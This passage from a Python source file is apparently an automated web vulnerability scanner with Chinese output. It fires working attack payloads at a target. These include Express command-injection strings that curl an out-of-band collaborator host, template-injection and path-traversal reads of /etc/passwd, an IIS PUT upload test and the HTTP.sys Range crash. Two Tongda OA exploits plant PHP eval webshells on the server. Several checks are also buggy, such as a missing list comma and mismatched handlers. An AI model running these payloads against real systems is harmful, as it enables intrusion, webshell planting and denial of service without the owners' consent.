                with open('./result/tomcat.txt', 'a') as w:
                    w.write("tomcat命令执行net+user:%s" % parems_url + '\n')
        except Exception as e:
            pass

    def _tomcat_work(self, url, thread):
        self._ot.print_out("开始检测Tomcat漏洞......")
        work_list = [self._tomcat, self._tomcat2]
        time.sleep(1)
        with tqdm(total=len(work_list), desc='Weblogic检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(thread, url) as pool:
                try:
                    futures = [pool.submit(job, url) for job in work_list]
                except Exception as e:
                    pass
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("Tomcat检测结束")

    def _express(self, url):
        try:
            response = requests.get(url, headers=gl_headers, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
            response.encoding = response.apparent_encoding
            if 'root' in response.text:
                with open('./result/express.txt', 'a') as w:
                    w.write(url + "\n")
        except Exception as e:
            pass

    def _express_work(self, url, thread):
        self._ot.print_out("开始检测Express漏洞......")
        exp_url = [
            f"{url}/?test=Function(require('child_process').exec('curl+547q0etugr2fu1ehjlkto83s1j79vy.burpcollaborator.net'))()",
            f"{url}/?test=Reflect.construct(Function,[res.send(require('child_process').execSync('ifconfig'))])()",
        ]
        time.sleep(1)
        with tqdm(total=len(exp_url), desc='Express检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(thread) as pool:
                try:
                    futures = [pool.submit(self._express, res_url) for res_url in exp_url]
                except Exception as e:
                    pass
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("Express检测结束")

    def _jetty(self, url):
        try:
            response = requests.get(url, headers=gl_headers, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
            response.encoding = response.apparent_encoding
            if response.status_code == 200 and 'web-app' in response.text:
                with open('./result/jetty.txt', 'a') as w:
                    w.write(url + '\n')
        except Exception as e:
            pass

    def _jetty_work(self, url, thread):
        self._ot.print_out("开始检测Jetty历史漏洞......")
        poc_list = [
            f"{url}/static?/%2557EB-INF/web.xml",
            f"{url}/%2e/WEB-INF/web.xml",
            f"{url}/%u002e/WEB-INF/web.xml",
            f"{url}/.%00/WEB-INF/web.xml",
        ]
        time.sleep(1)
        with tqdm(total=len(poc_list), desc='Jetty检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(thread) as pool:
                try:
                    futures = [pool.submit(self._express, res_url) for res_url in poc_list]
                except Exception as e:
                    pass
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("Jetty检测结束")

    def _iis(self, url):
        res_url = f"{url}/qqq.txt"
        data = 'hello,iis'
        try:
            resp = requests.put(res_url, data=data, headers=gl_headers, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
            response = requests.get(res_url, headers=gl_headers, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
            response.encoding = response.apparent_encoding
            if 'hello,iis' in response.text:
                with open('./result/iis.txt', 'a') as w:
                    w.write('存在iis-put上传,参考https://mp.weixin.qq.com/s/2pJGyIOKEFvI-LqdHMLudQ,漏洞地址:' + res_url + '\n')
        except Exception as e:
            pass

    def _iis_http_sys(self, url):
        headers = {
            'Range': 'bytes=0-18446744073709551615',
        }
        try:
            response = requests.get(url, headers=headers, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
            if response.status_code == 416 and 'Range Not Satisfiable' in response.text:
                with open('./result/iis.txt', 'a') as w:
                    w.write('存在iis-hhtp-sys远程代码执行，可造成服务器蓝屏死机:' + url + '网站请求头改为:Range: bytes=0-18446744073709551615\n')
        except Exception as e:
            pass

    def _iis_work(self, url, thread):
        self._ot.print_out("开始检测IIS漏洞......")
        poc_list = [
            self._iis,
            self._iis_http_sys,
            self._iis_duan_dir
        ]
        time.sleep(1)
        with tqdm(total=len(poc_list), desc='IIS检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(thread) as pool:
                try:
                    futures = [pool.submit(job, url) for job in poc_list]
                except Exception as e:
                    pass
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("IIS检测结束")

    def _jboss_rce(self, url):
        try:
            res_url = f"{url}/invoker/readonly"
            response = requests.get(url, headers=gl_headers, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
            if response.status_code == 500:
                with open('./result/jboss.txt', 'a') as w:
                    w.write('存在jboss-CVE-2017-12149-rce,工具https://github.com/yunxu1/jboss-_CVE-2017-12149，网站位置:' + res_url + '\n')
        except Exception as e:
            pass

    def _jboss_rce2(self, url):
        try:
            res_url = f"{url}/jbossmq-httpil/HTTPServerILServlet"
            response = requests.get(url, headers=gl_headers, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
            response.encoding = response.apparent_encoding
            if 'This is the JBossMQ HTTP-IL' in response.text:
                with open('./result/jboss.txt', 'a') as w:
                    w.write('存在jboss-CVE-2017-7504,工具https://github.com/joaomatosf/JavaDeserH2HC，网站位置:' + res_url + '\n')
        except Exception as e:
            pass

    def _jboss_rce_work(self, url, thread):
        self._ot.print_out("开始检测Jboss-Rce......")
        poc_list = [
            self._jboss_rce,
            self._jboss_rce2
        ]

        with tqdm(total=len(poc_list), desc='Jboss检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(thread) as pool:
                try:
                    futures = [pool.submit(jobs, url) for jobs in poc_list]
                except Exception as e:
                    pass
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("Jboss-Rce检测结束")

    def _minio(self, url):
        hostname = url.split('/')[2]
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
            "host": hostname,
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = ""
        try:
            response = requests.post(url, headers=headers, data=data, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
            response.encoding = response.apparent_encoding
            if 'Minio' in response.text:
                with open('./result/minio.txt', 'a') as w:
                    w.write(url + '\n')
        except Exception as e:
            pass

    def _crlf(self, url):
        payload = "adminisistrator"
        try:
            response = requests.get(url=url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=2, proxies=gl_proxy)
            response.encoding = response.apparent_encoding
            if response.status_code == 200 and (payload in response.text or "Test: CRLF Injection" in response.text):
                with open('result/crlf.txt', 'a') as w:
                    w.write(url + '\n')
        except Exception as e:
            pass

    def _crlf_work(self, url, threads):
        self._ot.print_out("开始CRLF检测......")
        new_url_list = []
        payloads = ["/%E5%98%8A%E5%98%8Dcontent-type:text/html/t5/988A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%5%98%8A%5%98%8D%E5%98%BCsvg/onload-alert%28adminisistrator%29%5%98%BE", "/%0d%0aTest: CRLF Injection"]
        for payload in payloads:
            new_url_list.append(url + payload)
        time.sleep(1)
        with tqdm(total=(len(new_url_list)), desc='CRLF检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    futures = [pool.submit(self._crlf, crlf_url) for crlf_url in new_url_list]
                except Exception as e:
                    pass

                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("CRLF检测结束")

    def _minio_work(self, url, thread):
        self._ot.print_out("开始检测Minio漏洞......")
        port_list = ['', ':9000', ':9001', ':7000', ':7001', ':9800', ':9889', ':9029']
        url_list = []
        for port in port_list:
            poc_url = f"{url}{port}/minio/bootstrap/v1/verify"
            url_list.append(poc_url)
        time.sleep(1)
        with tqdm(total=len(url_list), desc='Mnino检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(thread) as pool:
                try:
                    futures = [pool.submit(self._minio, res_url) for res_url in url_list]
                except Exception as e:
                    pass
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("Minio漏洞检测结束")

    def _ssit_two(self, url):
        try:
            response = requests.get(url=url, headers=gl_headers, verify=gl_verify, cookies=gl_cookie, timeout=2, proxies=gl_proxy)
            if response.status_code == 200 and "root" in response.text:
                with open('./result/moban.txt', 'a') as w:
                    w.write(url + '\n')
        except Exception as e:
            pass

    def _ssit_two_work(self, link_list, threads):
        self._ot.print_out("开始检测模版注入RCE......")
        self._ot.print_out("再次声明:")
        self._ot.print_out("漏洞检测主要针对SSTI")
        self._ot.print_out("SSTI与CSTI的区别在于对结果的解析,CSTI由于存在客户端不会解析出结果,而SSTI会解析出结果")
        self._ot.print_out("若不存在SSTI,可通过以下方式自行检测CSTI:")
        self._ot.print_out("例如{{config}}、{{self}}、{{request}}等敏感词")

        # ${{<%[%'"}}%\
        payloads = [
            "${{$s=file_get_contents('/etc/passwd',NULL,NULL,0,100);$var_dump($s);}}",
            "$eval($s=file_get_contents('/etc/passwd',NULL,NULL,0,100);$var_dump($s);)",
            "{{$s=file_get_contents('/etc/passwd',NULL,NULL,0,100);$var_dump($s);}}",
            "{php}$s=file_get_contents('/etc/passwd',NULL,NULL,0,100);$var_dump($s);{/php}",
            "${$s=file_get_contents('/etc/passwd',NULL,NULL,0,100);$var_dump($s);}",
            "<%$s=file_get_contents('/etc/passwd',NULL,NULL,0,100);$var_dump($s);%>",
            "{%$s=file_get_contents('/etc/passwd',NULL,NULL,0,100);$var_dump($s);%}",
            "{{-$s=file_get_contents('/etc/passwd',NULL,NULL,0,100);$var_dump($s);-}}"
        ]
        new_url_list = []
        for url in link_list:
            counts = url.count('=')
            for payload in payloads:
                for num in range(1, counts + 1):
                    mb_url = url.replace(url.split('=')[num].split('&' or '/')[0], payload)
                    if "http" in mb_url:
                        new_url_list.append(mb_url)
        if new_url_list:
            time.sleep(1)
            with tqdm(total=len(new_url_list), desc='CSTI/SSTI-RCE检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
                with ThreadPoolExecutor(threads) as pool:
                    try:
                        futures = [pool.submit(self._ssit, url) for url in new_url_list]
                    except Exception as e:
                        pass
                    for future in concurrent.futures.as_completed(futures):
                        future.result()
                        pbar.update(1)
                wait(futures)
            time.sleep(1)
            self._ot.print_out("模版注入RCE检测结束")

    def _lanling_oa(self, url):
        self._ot.print_out("开始检测蓝凌OA任意文件读取......")
        new_url = url + "/sys/ui/extend/varkind/custom.jsp"
        data = "var={“body”:{“file”:”file:///etc/passwd”}}"
        try:
            response = requests.post(new_url, headers=gl_headers, data=data, timeout=5, verify=gl_verify, proxies=gl_proxy)
            response.encoding = response.apparent_encoding
            if response.status_code == 200 and "root" in response.text:
                with open("./result/lanling.txt", "a") as w:
                    w.write("存在蓝凌OA任意文件读取:" + new_url + ",请求体:" + data + "\n")
        except Exception as e:
            pass
        self._ot.print_out("蓝凌OA任意文件读取检测结束")

    def _dir_liulan(self, url):
        try:
            response = requests.post(url, headers=gl_headers, timeout=5, verify=gl_verify, proxies=gl_proxy, cookies=gl_cookie)
            response.encoding = response.apparent_encoding
            if "phpmyadmin" in response.text:
                with open("./result/dir.txt", "a") as w:
                    w.write("找到phpmyadmin:" + url + "\n")
            if "index of" in response.text:
                with open("./result/dir.txt", "a") as w:
                    w.write("存在目录浏览:" + url + "\n")
            elif response.status_code == 200 and "error" not in response.text and "not found" not in response.text and "404" not in response.text:
                if "/.svn/entries" in url:
                    with open("./result/dir.txt", "a") as w:
                        w.write("可能存在目录浏览:" + url + "若能获取conf.php可通过路径/.svn/text-base/conf.php.svn-base进行下载\n")
                else:
                    with open("./result/dir.txt", "a") as w:
                        w.write("可能存在目录浏览:" + url + "\n")

        except Exception as e:
            pass

    def _dir_liulan_work(self, url, threads):
        self._ot.print_out("开始检测目录浏览漏洞......")
        url_list = []
        poc = [
            "/wp-config/",
            "/wp-includes/",
            "/web/",
            "/.git/",
            "/.git/config",
            "/.svn/entries",
            "/config/config.properties",
            "/jdbc.properties",
            "/config.xml",
            "/web.xml",
            "/sysconfig.properties",
            "/applicationContext.xml",
            "/configure/configure.properties",
            "/test.php",
            "/phpinfo.php",
            "/php_info.php",
            "/info.php",
            "/ceshi.php",
            "/1.php",
            "/phpmyadmin"
        ]
        for i in poc:
            url_list.append(url + i)
        time.sleep(1)
        with tqdm(total=len(url_list), desc='目录浏览检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    futures = [pool.submit(self._dir_liulan, res_url) for res_url in url_list]
                except Exception as e:
                    pass
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("目录浏览漏洞检测结束")

    def _db_baopo_work(self, url_list):
        self._ot.print_out("开始爆库路径检测......")
        new_list = []
        for url in url_list:
            counts = url.count('/')
            if counts >= 4 and "=" in url:
                new_list.append(url)
        if new_list:
            for i in new_list:
                with open('./result/asp.txt', 'a') as w:
                    w.write("可测试%5c爆库:" + i + "，payload:/a*~1*/.aspx\n")

        self._ot.print_out("爆库路径检测结束")
        time.sleep(1)

    def _iis_duan_dir(self, url):
        new_url = url + "/a*~1*/.aspx"
        try:
            response = requests.get(new_url, headers=gl_headers, timeout=5, verify=gl_verify, proxies=gl_proxy, cookies=gl_cookie)
            if response.status_code == 404:
                with open("./result/iis.txt", "a") as w:
                    w.write("可尝试IIS短文件检测路径:" + new_url + "\n")
        except Exception as e:
            pass

    def _rsync(self, url):
        self._ot.print_out("开始检测Rsync未授权漏洞......")
        poc_url = [
            f"{url}/src/etc/password ./"
            f"{url}:873/src/etc/password ./"
        ]
        for i in poc_url:
            try:
                response = requests.get(i, headers=gl_headers, timeout=5, verify=gl_verify, proxies=gl_proxy, cookies=gl_cookie)
                response.encoding = response.apparent_encoding
                if 'root:' in response.text:
                    with open("./result/rsync.txt", "a") as w:
                        w.write("存在rsync未授权:" + i + "\n")
            except Exception as e:
                pass
        self._ot.print_out("Rsync未授权检测结束")
    def _tongdaOA(self, url):
        new_url = url + "/general/appbuilder/web/portal/gateway/getdata?activeTab=%e5%27,1%3d%3Efwrite(fopen(%22C:/YAOA/webroot/general/1.php%22,%22w+%22),%22%3C?php%20eval(next(getallheaders()));%22))%3b/*&id=266&module=Carouselimage"
        try:
            response = requests.get(new_url, headers=gl_headers, timeout=5, verify=gl_verify, proxies=gl_proxy, cookies=gl_cookie)
            time.sleep(1)
            new_url2 = url + "/1.php"
            response2 = requests.get(new_url2, headers=gl_headers, timeout=5, verify=gl_verify, proxies=gl_proxy, cookies=gl_cookie)
            if response2.status_code == 200 and '404' not in response2.text and 'error' not in response2.text:
                with open('./result/oa.txt', 'a') as w:
                    w.write("存在tongdaOA漏洞:" + new_url + ",写入地址:" + new_url2 + "\n")
        except Exception as e:
            pass

    def _tongdaOA_two(self, url):
        new_url = url + "/general/2.php"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.50',
            'Cookie': "file_put_contents('2.php', '<?php @eval($_POST[1])?>')"
        }

        try:
            response = requests.get(new_url, headers=headers, timeout=5, verify=gl_verify, proxies=gl_proxy, cookies=gl_cookie)
            time.sleep(1)
            response2 = requests.get(new_url, headers=gl_headers, timeout=5, verify=gl_verify, proxies=gl_proxy, cookies=gl_cookie)
            if response2.status_code == 200 and 'error' not in response2.text and '404' not in response2.text:
                with open('./result/oa.txt', 'a') as w:
                    w.write("存在tongdaOA漏洞:" + url + ",写入地址:" + new_url + "\n")
        except Exception as e:
            pass

    def _tongdaOA_work(self, url, threads):
        self._ot.print_out("开始检测通达OA漏洞......")
        work_list = [
            self._tongdaOA,
            self._tongdaOA_two
        ]
        time.sleep(1)
        with tqdm(total=len(work_list), desc='通达OA检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    futures = [pool.submit(poc, url) for poc in work_list]
                except Exception as e:
                    pass
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("通达OA漏洞检测结束")
    def _OpenResty(self,url):
        self._ot.print_out("开始检测OpenResty漏洞......")
        new_url = url + "/rewrite?x=/../../../../etc/passwd"
        try:
            response = requests.get(new_url, headers=gl_headers, timeout=5, verify=gl_verify, proxies=gl_proxy, cookies=gl_cookie)
            response.encoding = response.apparent_encoding
            if "root:" in response.text:
                with open('./result/openresty.txt', 'a') as w:
                    w.write("存在openresty目录穿越漏洞:" + new_url + "\n")
        except Exception as e:
            pass
        self._ot.print_out("OpenResty漏洞检测结束")

    def main(self, demo_url, threads):
        self._ot.print_out("开始整理URL链接......")
        time.sleep(1)
        link_list = []
        asp_link_list = []
        with open('result/link.txt', 'r') as links:
            links_lines = links.readlines()
            for link in links_lines:
                link = link.strip()
                if link:
                    if link.split('/')[2].strip() == demo_url.split('/')[2].strip():
                        if 'root' in link or 'admin' in link or 'login' in link:
                            self._ot.print_out(f"找到敏感路径: {link.strip()}")
                        if '.stm' in link or '.shtm' in link or '.shtml' in link:
                            with open('./result/ssi.txt', 'a') as w:
                                w.write("检测到铭感后缀,有可能存在ssi漏洞:" + f"{link}" + '参考上传payload:<!--#exec cmd=""cat /etc/passwd"-->\n')
                        if "=" in link:
                            link_list.append(link.strip())
                        if ".aps" in link:
                            asp_link_list.append(link.strip())
        self._ot.print_out("URL链接整理结束")
        # xss/sql
        if link_list:
            time.sleep(2)
            self._xss_work(link_list, threads)
            # sql 检测
            time.sleep(2)
            self._sql_work(link_list, links_lines, threads)
            # 命令执行
            time.sleep(2)
            self._cmd_work(link_list, threads)
            # 模版注入
            time.sleep(2)
            self._ssit_work(link_list, threads)
            time.sleep(2)
            # 模版rce
            self._ssit_two_work(link_list, threads)
            # 目录穿越
            time.sleep(2)
            self._dir_work(demo_url, link_list, threads)
        if asp_link_list:
            time.sleep(2)
            self._db_baopo_work(asp_link_list)
        # tp
        time.sleep(2)
        self._crlf_work(demo_url, threads)
        time.sleep(2)
        self._ssrf(demo_url)
        time.sleep(2)
        self._thinkphp_work(demo_url, threads)
        time.sleep(2)
        # webpack源码
        self._webpack_ym_work(demo_url, threads)
        time.sleep(2)
        # 敏感文件
        self._web_info_work(demo_url, threads)
        time.sleep(2)
        self._dir_liulan_work(demo_url, threads)
        time.sleep(2)
        # pma
        self._pma_work(demo_url, threads)
        # wp
        time.sleep(2)
        self._wordpress_work(demo_url, threads)
        time.sleep(2)
        self._wp_sql(demo_url)
        time.sleep(2)
        self._wp_feed_work(demo_url, threads)
        time.sleep(2)
        # 未授权
        # self._unauthorized_work(threads)
        # time.sleep(2)
        # apache
        self._apache_http_work(demo_url, threads)
        time.sleep(1)
        self._apache_druid(demo_url)
        time.sleep(2)
        # php-union
        self._php_work(demo_url, threads)
        time.sleep(2)
        # xxe
        self._xxe(demo_url)
        time.sleep(2)
        # struts
        self._struts_work(demo_url, threads)
        time.sleep(2)
        # spring目录
        self._spring_work(demo_url, threads)
        time.sleep(2)
        # spring-rce
        self._spring_rce(demo_url)
        time.sleep(2)
        self._spring_spel(demo_url)
        time.sleep(2)
        # swagger
        self._swagger_work(threads)
        time.sleep(2)
        # jsonp目录及检测
        self._json_url_check_work(threads)
        time.sleep(2)
        self._jsonp_work(demo_url, threads)
        time.sleep(2)
        # cors
        self._cors(demo_url)
        time.sleep(2)
        # shiro
        self._shiro(demo_url)
        time.sleep(2)
        # node_js
        self._node_js(demo_url)
        time.sleep(2)
        # django
        self._django(demo_url)
        time.sleep(2)
        # juqery
        self._juqery(demo_url)
        time.sleep(2)
        # 帆软
        self._fanruan_work(demo_url, threads)
        time.sleep(2)
        # Jboss未授权
        self._jboss_work(demo_url, threads)
        time.sleep(2)
        self._jboss_rce_work(demo_url, threads)
        time.sleep(2)
        self._zabbix_work(demo_url, threads)
        time.sleep(2)
        self._joomla(demo_url)
        time.sleep(2)
        self._xssi(demo_url)
        time.sleep(2)
        self._weblogic_work(demo_url, threads)
        time.sleep(2)
        self._express_work(demo_url, threads)
        time.sleep(2)
        self._jetty_work(demo_url, threads)
        time.sleep(2)
        self._tomcat_work(demo_url, threads)
        time.sleep(2)
        self._iis_work(demo_url, threads)
        time.sleep(2)
        self._minio_work(demo_url, threads)
        time.sleep(2)
        self._lanling_oa(demo_url)
        time.sleep(2)
        self._rsync(demo_url)
        time.sleep(2)
        self._OpenResty(demo_url)
        time.sleep(2)
        self._thinkphp_work(demo_url, threads)
        time.sleep(2)
        self._ot.print_out("任务全部执行完成")
        self._ot.print_out("输出结果保留result文件夹\nbyebye:)")


if __name__ == '__main__':
    Pocman()
